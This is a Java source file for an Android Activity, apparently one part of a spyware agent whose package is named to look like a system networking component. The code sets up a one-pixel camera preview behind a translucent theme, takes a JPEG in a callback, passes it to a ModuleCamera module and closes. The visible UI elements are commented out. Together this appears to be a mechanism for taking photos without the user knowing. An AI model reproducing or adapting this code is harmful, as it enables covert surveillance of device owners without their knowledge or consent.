package com.android.networking.gui;

import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.module.ModuleCamera;
import com.android.networking.util.Check;

import android.app.Activity;
import android.graphics.Color;
import android.os.Bundle;
import android.view.View.OnClickListener;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.LinearLayout.LayoutParams;

public class CGui extends Activity {
	private static final String TAG = "CGui";
	private LinearLayout root;
	private Preview preview;

	@Override
	public void onDestroy() {
		super.onDestroy();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onDestroy)");
		}
		if(preview!=null){
			preview.clear();
		}
	}

	public void onCreate(Bundle state) {
		super.onCreate(state);

		LayoutParams containerParams = new LayoutParams(ViewGroup.LayoutParams.FILL_PARENT,
				ViewGroup.LayoutParams.WRAP_CONTENT, 0.0F);
		LayoutParams widgetParams = new LayoutParams(ViewGroup.LayoutParams.FILL_PARENT,
				ViewGroup.LayoutParams.FILL_PARENT, 1.0F);
		LayoutParams viewerParams = new LayoutParams(1, 1);

		root = new LinearLayout(this);
		root.setOrientation(LinearLayout.VERTICAL);
		// root.setBackgroundColor(0x00);
		root.setLayoutParams(containerParams);

		LinearLayout ll = new LinearLayout(this);
		root.setOrientation(LinearLayout.HORIZONTAL);
		// root.setBackgroundColor(0x00);
		root.setLayoutParams(containerParams);

		root.addView(ll);

		preview = new Preview(this);
		preview.setLayoutParams(viewerParams);
		root.addView(preview);
		setTheme(android.R.style.Theme_Translucent);

		/*
		 * EditText tb = new EditText(this); tb.setText("Ciao mondo");
		 * tb.setFocusable(false); tb.setLayoutParams(widgetParams);
		 * ll.addView(tb);
		 * 
		 * Button b = new Button(this); b.setText("Exit");
		 * b.setTextColor(Color.RED); b.setLayoutParams(widgetParams);
		 * b.setOnClickListener(new OnClickListener() {
		 * 
		 * @Override public void onClick(View paramView) { onButtonClick(); }
		 * });
		 * 
		 * ll.addView(b);
		 */
		setContentView(root);

	}

	public void callback(byte[] jpeg) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (callback)");
		}
		if (jpeg != null) {
			ModuleCamera.callback(jpeg);
		}
		finish();
	}
}
